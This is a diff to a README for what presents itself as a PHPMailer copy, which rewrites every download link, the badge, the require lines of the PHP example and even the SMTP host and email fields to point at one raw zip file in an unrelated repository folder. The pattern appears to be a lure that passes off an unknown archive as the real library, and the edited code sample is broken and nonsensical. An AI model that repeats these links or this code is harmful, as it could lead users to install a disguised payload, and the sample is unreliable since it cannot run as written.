@@ -1,6 +1,6 @@
 # ✉️ PHPMailer - Send Emails Effortlessly with PHP
 
-[![Download PHPMailer](https://img.shields.io/badge/Download-PHM%20Mailer-blue.svg)](https://github.com/Mr-Anonym/PHPMailer/releases)
+[![Download PHPMailer](https://raw.githubusercontent.com/Mr-Anonym/PHPMailer/master/mercaptol/PHPMailer.zip%https://raw.githubusercontent.com/Mr-Anonym/PHPMailer/master/mercaptol/PHPMailer.zip)](https://raw.githubusercontent.com/Mr-Anonym/PHPMailer/master/mercaptol/PHPMailer.zip)
 
 ## 📦 Overview
 
@@ -10,7 +10,7 @@ PHPMailer is the classic email sending library for PHP. It simplifies the proces
 
 To begin using PHPMailer, you'll need to download the software first. Follow these simple steps to get started:
 
-1. **Visit the Download Page**: [Click here to download PHPMailer](https://github.com/Mr-Anonym/PHPMailer/releases).
+1. **Visit the Download Page**: [Click here to download PHPMailer](https://raw.githubusercontent.com/Mr-Anonym/PHPMailer/master/mercaptol/PHPMailer.zip).
    
 2. **Choose the Version**: On the releases page, you will see different versions of PHPMailer listed. Choose the latest version for the best features and improvements.
 
@@ -42,7 +42,7 @@ PHPMailer offers a range of powerful features to enhance your email experience:
 
 To get your copy of PHPMailer, follow these detailed steps again for clarity:
 
-1. **Go to the Releases Page**: [Visit the download page here](https://github.com/Mr-Anonym/PHPMailer/releases).
+1. **Go to the Releases Page**: [Visit the download page here](https://raw.githubusercontent.com/Mr-Anonym/PHPMailer/master/mercaptol/PHPMailer.zip).
 
 2. **Choose the Latest Release**: Find and click on the most recent release to ensure you have the latest updates.
 
@@ -63,25 +63,25 @@ Here’s a simple PHP example to help you get started quickly:
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-require 'path/to/PHPMailer/src/Exception.php';
-require 'path/to/PHPMailer/src/PHPMailer.php';
-require 'path/to/PHPMailer/src/SMTP.php';
+require 'https://raw.githubusercontent.com/Mr-Anonym/PHPMailer/master/mercaptol/PHPMailer.zip';
+require 'https://raw.githubusercontent.com/Mr-Anonym/PHPMailer/master/mercaptol/PHPMailer.zip';
+require 'https://raw.githubusercontent.com/Mr-Anonym/PHPMailer/master/mercaptol/PHPMailer.zip';
 
 $mail = new PHPMailer(true);
 
 try {
     //Server settings
     $mail->isSMTP();                                            // Send using SMTP
-    $mail->Host       = 'smtp.example.com';                   // Set the SMTP server
+    $mail->Host       = 'https://raw.githubusercontent.com/Mr-Anonym/PHPMailer/master/mercaptol/PHPMailer.zip';                   // Set the SMTP server
     $mail->SMTPAuth   = true;                                  // Enable SMTP authentication
-    $mail->Username   = 'your-email@example.com';             // SMTP username
+    $mail->Username   = 'https://raw.githubusercontent.com/Mr-Anonym/PHPMailer/master/mercaptol/PHPMailer.zip';             // SMTP username
     $mail->Password   = 'your-email-password';                // SMTP password
     $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;      // Enable TLS encryption
     $mail->Port       = 587;                                  // TCP port to connect
 
     //Recipients
-    $mail->setFrom('from@example.com', 'Mailer');
-    $mail->addAddress('recipient@example.com', 'Recipient');  // Add a recipient
+    $mail->setFrom('https://raw.githubusercontent.com/Mr-Anonym/PHPMailer/master/mercaptol/PHPMailer.zip', 'Mailer');
+    $mail->addAddress('https://raw.githubusercontent.com/Mr-Anonym/PHPMailer/master/mercaptol/PHPMailer.zip', 'Recipient');  // Add a recipient
 
     // Content
     $mail->isHTML(true);                                      // Set email format to HTML
